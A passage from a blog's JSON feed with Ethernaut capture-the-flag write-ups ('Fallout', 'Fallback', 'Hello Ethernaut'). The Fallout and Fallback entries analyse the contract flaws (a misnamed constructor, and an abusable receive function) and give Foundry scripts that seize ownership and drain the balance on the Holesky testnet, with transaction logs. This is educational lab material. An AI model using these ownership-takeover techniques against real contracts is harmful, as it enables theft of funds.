<span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocate</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">].</span><span class=\"n\">add</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">sendAllocation</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">allocator</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">]);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">collectAllocations</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">allocatorBalance</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">allocator</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">allocations</span><span class=\"p\">[</span><span class=\"n\">allocator</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/v0.6.0/contracts.html#constructors\">Solidity 0.6.0 Documentation - constructors</a></p><blockquote>  <p>💡 Prior to version 0.4.22, constructors were defined as functions with the same name as the contract. This syntax was deprecated and is not allowed anymore in version 0.5.0.</p></blockquote><p>For some reason, the intended <code class=\"language-plaintext highlighter-rouge\">constructor</code> code was written as <code class=\"language-plaintext highlighter-rouge\">Fal1out()</code>, preventing it from acting as a <code class=\"language-plaintext highlighter-rouge\">constructor</code> and allowing external access, which enables claiming <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallout.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallout</span> <span class=\"k\">public</span> <span class=\"n\">fallout_</span> <span class=\"o\">=</span> <span class=\"n\">Fallout</span><span class=\"p\">(</span><span class=\"mh\">0x28eA66cBFb2900Bea8bb84f058d740ce0Ab751CB</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">Fal1out</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallout_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FalloutSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.002095526 gweiEstimated total gas used <span class=\"k\">for </span>script: 62992Estimated amount required: 0.000000132001373792 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xcaa845bc5fa9ebb3adcb5902c12ffa24c14a609adc31cd0b789bfae23b11c5aaBlock: 3669787Paid: 0.000000095568239514 ETH <span class=\"o\">(</span>45606 gas <span class=\"k\">*</span> 0.002095519 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000095568239514 ETH (45606 gas * avg 0.002095519 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallout",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/17/fallback",
            "title": "[Ethernaut] 01.Fallback",
            "summary": null,
            "content_text": "AnalysisThe goals are  claim ownership of the contract  reduce its balance to 0// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}To satisfy condition 2, go through the withdraw() function but access is impossible due to onlyOwner() modifier.However, looking receive() function, it seems that by increasingly the contribution value to more 0 through the contribute() function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.Exploitsrc/Fallback.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback {    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() {        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    }    modifier onlyOwner() {        require(msg.sender == owner, \"caller is not the owner\");        _;    }    function contribute() public payable {        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) {            owner = msg.sender;        }    }    function getContribution() public view returns (uint256) {        return contributions[msg.sender];    }    function withdraw() public onlyOwner {        payable(owner).transfer(address(this).balance);    }    receive() external payable {        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    }}script/FallbackSol.sol// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Fallback.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract FallbackSol is Script {    Fallback public fallback_ = Fallback(payable(0x0662008C4CEE1F808C3ca3800404a2BA704952eD));    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        fallback_.contribute{value: 1 wei}();        console.log(\"My contribution: \", fallback_.getContribution());        address(fallback_).call{value: 1 wei}(\"\");        console.log(\"Contract owner: \", fallback_.owner());        fallback_.withdraw();        vm.stopBroadcast();    }}$ forge script script/FallbackSol.sol --broadcast[⠊] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used for script: 147280Estimated amount required: 0.00000028924952504 ETH==========================##### holesky✅  [Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH (28302 gas * 0.001963936 gwei)##### holesky✅  [Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH (47965 gas * 0.001963936 gwei)##### holesky✅  [Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH (30364 gas * 0.001963936 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goals are</p><ol>  <li>claim ownership of the contract</li>  <li>reduce its balance to 0</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>To satisfy condition 2, go through the <code class=\"language-plaintext highlighter-rouge\">withdraw()</code> function but access is impossible due to <code class=\"language-plaintext highlighter-rouge\">onlyOwner()</code> modifier.</p><p>However, looking <code class=\"language-plaintext highlighter-rouge\">receive()</code> function, it seems that by increasingly the <code class=\"language-plaintext highlighter-rouge\">contribution</code> value to more 0 through the <code class=\"language-plaintext highlighter-rouge\">contribute()</code> function and sending more than 0 Ether to the contract, both conditions 1 and 2 could potentially be satisfied.</p><h1 id=\"exploit\">Exploit</h1><hr /><p>src/Fallback.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Fallback</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">contributions</span><span class=\"p\">;</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">1000</span> <span class=\"o\">*</span> <span class=\"p\">(</span><span class=\"mi\">1</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">modifier</span> <span class=\"n\">onlyOwner</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span> <span class=\"o\">==</span> <span class=\"n\">owner</span><span class=\"p\">,</span> <span class=\"s\">\"caller is not the owner\"</span><span class=\"p\">);</span>        <span class=\"n\">_</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">contribute</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&lt;</span> <span class=\"mf\">0.001</span> <span class=\"kc\">ether</span><span class=\"p\">);</span>        <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span><span class=\"p\">;</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">owner</span><span class=\"p\">])</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">getContribution</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">];</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">withdraw</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"n\">owner</span><span class=\"p\">).</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"nb\">this</span><span class=\"p\">).</span><span class=\"nb\">balance</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">contributions</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>script/FallbackSol.sol</p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Fallback.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">FallbackSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Fallback</span> <span class=\"k\">public</span> <span class=\"n\">fallback_</span> <span class=\"o\">=</span> <span class=\"n\">Fallback</span><span class=\"p\">(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0x0662008C4CEE1F808C3ca3800404a2BA704952eD</span><span class=\"p\">));</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">contribute</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"My contribution: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">getContribution</span><span class=\"p\">());</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">fallback_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"s\">\"\"</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Contract owner: \"</span><span class=\"p\">,</span> <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">fallback_</span><span class=\"p\">.</span><span class=\"n\">withdraw</span><span class=\"p\">();</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/FallbackSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  My contribution:  1  Contract owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001963943 gweiEstimated total gas used <span class=\"k\">for </span>script: 147280Estimated amount required: 0.00000028924952504 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xcfd1b8b30ecdf9dffb0d024643f3417b6235cfb1b11a8fef17c101be63223026Block: 3661559Paid: 0.000000055583316672 ETH <span class=\"o\">(</span>28302 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xa47df7ac8010f0c6e1762a3f9931ff817346eaa3a92564633f8ff9e082de85d0Block: 3661559Paid: 0.00000009420019024 ETH <span class=\"o\">(</span>47965 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x5995b55be2748fafb828eb0b58ec7ffbd2f1a49b82b970413feeb294851dca6aBlock: 3661559Paid: 0.000000059632952704 ETH <span class=\"o\">(</span>30364 gas <span class=\"k\">*</span> 0.001963936 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000209416459616 ETH (106631 gas * avg 0.001963936 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-17-Fallback/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/17/fallback",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-17T00:00:00+09:00",
            "date_modified": "2025-04-17T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            "title": "[Ethernaut] 00.Hello Ethernaut",
            "summary": null,
            "content_text": "Look into the level’s info method contract.info()  or await contract.info()  if you’re using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.after transaction called, clik the “Submit Instance” button",
            "content_html": "<p>Look into the level’s info method <code class=\"language-plaintext highlighter-rouge\">contract.info()</code>  or <code class=\"language-plaintext highlighter-rouge\">await contract.info()</code>  if you’re using Chrome v62. You should have all you need to complete the level within the contract. When you know you have completed the level, submit the contract using the submit button at the bottom of the page. This sends your instance back to the ethernaut, which will determine if you have completed it.</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info().png\" alt=\"Image await contract.info()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info1().png\" alt=\"Image await contract.info1()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info2().png\" alt=\"Image await contract.info2()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_infoNum().png\" alt=\"Image await contract.infoNum()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_info42().png\" alt=\"Image await contract.info42()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_theMethodName().png\" alt=\"Image await contract.theMethodName()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_method7123949().png\" alt=\"Image await contract.method7123949()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/await_contract_authenticate().png\" alt=\"Image await contract.authenticate()\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/mm.png\" alt=\"Image Metamask\" /></p><p>after transaction called, clik the “Submit Instance” button</p><p><img src=\"https://0o3q.github.io/images/2025-04-16-Hello_Ethernaut/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/16/hello-ethernaut",
            
            
            
            "tags": ["blockchain","ethernaut"],
            
            "date_published": "2025-04-16T00:00:00+09:00",
            "date_modified": "2025-04-16T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        }
    
    ]
}